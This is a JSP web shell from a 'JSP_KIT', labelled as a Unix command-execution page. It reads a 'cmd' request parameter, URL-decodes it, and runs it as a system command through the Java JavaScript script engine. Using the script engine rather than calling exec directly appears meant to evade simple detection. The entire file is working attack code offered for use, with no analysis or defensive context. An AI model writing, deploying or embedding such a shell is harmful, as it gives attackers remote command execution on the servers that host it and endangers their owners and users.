<%@ page import="java.util.*,java.io.*,javax.script.*,java.net.*"%>
<%
//
// JSP_KIT
//
// 1.jsp = Command Execution (unix)
//
// by: huzhanchi
//
%>
<HTML><BODY>
<%
if (request.getParameter("cmd") != null) {
        String n = request.getParameter("cmd");
  try {
        n = java.net.URLDecoder.decode(n, "UTF-8");
			} catch (Exception e) {
					  e.printStackTrace();
			}
        String j = System.getProperty("java.version");
        ScriptEngineManager engineManager = new ScriptEngineManager();
        ScriptEngine engine = null;
        boolean b = j.indexOf("1.7") == 0 ? true : false;
        engine = engineManager.getEngineByName("js");
        String m = b ? "(function sum() {importPackage(java.util);importPackage(java.lang);Runtime.getRuntime().exec(a); return a; })(a)" :
          "load(\"nashorn:mozilla_compat.js\");(function sum() {importPackage(java.util);importPackage(java.lang);Runtime.getRuntime().exec(a); return a; })(a)";
        Bindings bindings = engine.createBindings();
        bindings.put("a", n);
        engine.setBindings(bindings, ScriptContext.GLOBAL_SCOPE);
        engine.eval(m, bindings);
  }
%>
</BODY></HTML>

